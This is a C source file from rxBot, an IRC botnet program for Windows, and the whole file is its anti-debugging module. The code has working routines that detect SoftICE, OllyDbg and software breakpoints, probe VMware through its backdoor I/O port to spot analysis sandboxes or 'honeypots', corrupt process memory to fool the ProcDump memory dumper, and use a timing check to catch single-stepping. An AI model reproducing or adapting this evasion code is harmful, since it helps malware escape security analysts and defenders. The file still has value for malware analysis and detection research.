/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_ANTIDEBUG

#pragma warning(disable:4035)
#pragma warning(disable:4731)

/*
	Function: IsSICELoaded
	Description: This method is used by a lot of crypters/compresors it uses INT 41, this interrupt is used by Windows debugging interface to detect if a debugger is present. Only works under Windows.
	Returns: true if a debugger is detected
*/

__inline bool IsSICELoaded() {
//	_asm {
//		mov ah, 0x43
//		int 0x68
//		cmp ax, 0x0F386 // Will be set by all system debuggers.
//		jz out_
//
//		xor ax, ax
//		mov es, ax
//		mov bx, word ptr es:[0x68*4]
//		mov es, word ptr es:[0x68*4+2]
//		mov eax, 0x0F43FC80
//		cmp eax, dword ptr es:[ebx]
//		jnz out_
//		jmp normal_
//normal_:
//		xor eax, eax
//		leave
//		ret
//out_:
//		mov eax, 0x1
//		leave
//		ret
//	}
	return false;
}

/*
	Function: IsODBGLoaded
	Description: Tests if OllyDbg/other app debuggers is/are enabled
	Returns: true if a debugger is detected
*/

__inline bool IsODBGLoaded() {
	char *caption="DAEMON";
	_asm {
        push 0x00
        push caption
		
		mov eax, fs:[30h]				// pointer to PEB
		movzx eax, byte ptr[eax+0x2]
		or al,al
		jz normal_
        jmp out_
normal_:
		xor eax, eax
		leave
		ret
out_:
		mov eax, 0x1
		leave
		ret
	}
}

/*
	Function: IsSoftIceNTLoaded
	Description: Like the previous one but for use under Win NT only
	Returns: true if SoftIce is loaded
*/

__inline bool IsSoftIceNTLoaded() {
    HANDLE hFile=CreateFile( "\\\\.\\NTICE",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	
	if(hFile!=INVALID_HANDLE_VALUE) { 
		CloseHandle(hFile); 
		return true; 
	}
    return false; 
}

/*
	Functions are declared as __inline, this causes the expansion of this code each time a function is invoked, this is to difficult the cracker work by using this function more than once time
	Function: IsBPX
	Description: Checks if the given memory address is a breakpoint
	Returns: true if it is a breakpoint
*/

__inline bool IsBPX(void *address) {
	_asm {
		mov esi, address	// load function address
		mov al, [esi]		// load the opcode
		cmp al, 0xCC		// check if the opcode is CCh
		je BPXed			// yes, there is a breakpoint
		
		// jump to return true
		xor eax, eax		// false,
		jmp NOBPX			// no breakpoint
BPXed:
		mov eax, 1			// breakpoint found
NOBPX:
	}
}

#pragma warning(default:4731)
#pragma warning(default:4035)

/*
	executes VMware backdoor I/O function call
*/

#define VMWARE_MAGIC		0x564D5868	// Backdoor magic number
#define VMWARE_PORT			0x5658		// Backdoor port number
#define VMCMD_GET_VERSION	0x0a		// Get version number

int VMBackDoor(unsigned long *reg_a, unsigned long *reg_b, unsigned long *reg_c, unsigned long *reg_d) {
	unsigned long a, b, c, d; b=reg_b?*reg_b:0; c=reg_c?*reg_c:0;

	__try {
		__asm {
			push eax
			push ebx
			push ecx
			push edx
			
			mov eax, VMWARE_MAGIC
			mov ebx, b
			mov ecx, c
			mov edx, VMWARE_PORT
			
			in eax, dx
			
			mov a, eax
			mov b, ebx
			mov c, ecx
			mov d, edx
			
			pop edx
			pop ecx
			pop ebx
			pop eax
		}
	} __except (EXCEPTION_EXECUTE_HANDLER) {}
	
	if(reg_a) *reg_a=a; 
	if(reg_b) *reg_b=b; 
	if(reg_c) *reg_c=c; 
	if(reg_d) *reg_d=d;
	return a; }

/*
	Check VMware version only
*/
 
int VMGetVersion() {
	unsigned long version, magic, command;
	command=VMCMD_GET_VERSION;	
	VMBackDoor(&version, &magic, &command, NULL);	
	if(magic==VMWARE_MAGIC) return version;
	else return 0; 
}

/*
	Check if running inside VMWare
*/

int IsVMWare() {
	int version=VMGetVersion();

	if(version) return true; else return false;
}

/*
	Fool ProcDump with increasing size
*/

void FoolProcDump() {
	__asm {
		mov eax, fs:[0x30]
		mov eax, [eax+0xC]
		mov eax, [eax+0xC]
		add dword ptr [eax+0x20], 0x2000	// increase size variable
	}
}

bool DetectDebuggers(void) {

	FoolProcDump();

	unsigned long lStartTime=GetTickCount();

	if(IsBPX(&IsBPX)) {
		addlog("[ANTI-DEBUG]: Breakpoint set on IsBPX, debugger active...");
		return true;
	}
	
	if(IsBPX(&IsSICELoaded)) {
		addlog("[ANTI-DEBUG]: Breakpoint set on IsSICELoaded, debugger active...");
		return true;
	}

	if(IsBPX(&IsSoftIceNTLoaded)) {
		addlog("[ANTI-DEBUG]: Breakpoint set on IsSoftIceNTLoaded, debugger active...");
		return true;
	}

	if(IsBPX(&IsVMWare)) {
		addlog("[ANTI-DEBUG]: Breakpoint set on IsVMWare, debugger active...");
		return true;
	}

	if(IsSoftIceNTLoaded()) {
		addlog("[ANTI-DEBUG]: SoftIce named pipe exists, maybe debugger is active...");
		return true;
	}

	if(IsSICELoaded()) {
		addlog("[ANTI-DEBUG]: SoftIce is loaded, debugger active...");
		return true;
	}

	if(IsVMWare()) {
		addlog("[ANTI-DEBUG]: Running inside VMWare, probably honeypot...");
		return true;
	}

	if(IsDebuggerPresent()) {
		if(IsBPX(&IsDebuggerPresent)) {
			addlog("[ANTI-DEBUG]: Breakpoint set on IsDebuggerPresent, debugger active..."); 
			return true;
		}

		if(IsDebuggerPresent()) {
			addlog("[ANTI-DEBUG]: IsDebuggerPresent returned true, debugger active...");
			return true;
		}
	}

	if((GetTickCount()-lStartTime) > 5000) {
		addlog("[ANTI-DEBUG]: Routine took too long to execute, probably single-step...");
		return true;
	}

	return false;
}

#endif